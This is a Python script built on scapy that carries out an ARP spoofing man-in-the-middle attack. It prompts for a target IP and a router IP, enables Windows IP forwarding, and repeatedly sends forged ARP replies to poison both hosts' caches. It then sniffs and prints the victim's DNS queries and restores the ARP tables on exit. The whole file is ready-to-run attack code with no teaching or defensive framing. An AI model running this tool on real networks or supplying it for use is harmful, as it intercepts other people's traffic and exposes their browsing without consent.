import scapy.all as scapy
import time
import os

interval = 4
ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter Router IP address: ")

# Enable IP forwarding on Windows
def enable_ip_forwarding():
    os.system("netsh interface ipv4 set global forwarding=enabled")
    print("IP forwarding enabled on Windows.")

# Disable IP forwarding on Windows (for cleanup)
def disable_ip_forwarding():
    os.system("netsh interface ipv4 set global forwarding=disabled")
    print("IP forwarding disabled on Windows.")

# Get MAC address function for a given IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"Could not find MAC address for IP {ip}")
        return None

# Spoof ARP packet to target and gateway
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not spoof {target_ip} - MAC address not found.")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restore ARP tables for target and gateway
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print(f"Could not restore ARP table for {destination_ip} - MAC address not found.")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Capture DNS Requests and log DNS queries
def dns_sniff(packet):
    if packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0:  # DNS query
        print(f"DNS Request for: {packet[scapy.DNSQR].qname.decode()}")

# Main function to start spoofing and DNS sniffing
def start_spoofing():
    enable_ip_forwarding()
    try:
        print("Starting ARP spoofing...")
        while True:
            spoof(ip_target, ip_gateway)
            spoof(ip_gateway, ip_target)
            # Capture DNS traffic for monitoring or modification
            scapy.sniff(filter="udp port 53", prn=dns_sniff, store=False, count=10)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables and stopping spoofing...")
        restore(ip_gateway, ip_target)
        restore(ip_target, ip_gateway)
        disable_ip_forwarding()
        print("ARP tables restored. Exiting...")

# Run the ARP spoofing and DNS handling
start_spoofing()
